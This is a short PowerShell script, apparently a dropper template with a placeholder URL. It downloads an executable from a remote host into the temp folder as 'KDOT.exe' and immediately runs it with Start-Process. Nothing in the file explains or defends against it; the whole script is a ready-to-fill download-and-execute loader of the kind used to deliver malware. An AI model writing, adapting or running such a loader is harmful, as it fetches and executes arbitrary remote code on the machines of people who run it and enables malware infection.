$file_url = "YOUR_URL_HERE"
$file_extension = "exe"

function Main {
    $temp_dir = [System.IO.Path]::GetTempPath()
    $out_file = $temp_dir + "KDOT." + $file_extension
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($file_url, $out_file)
    Start-Process $out_file
}

Main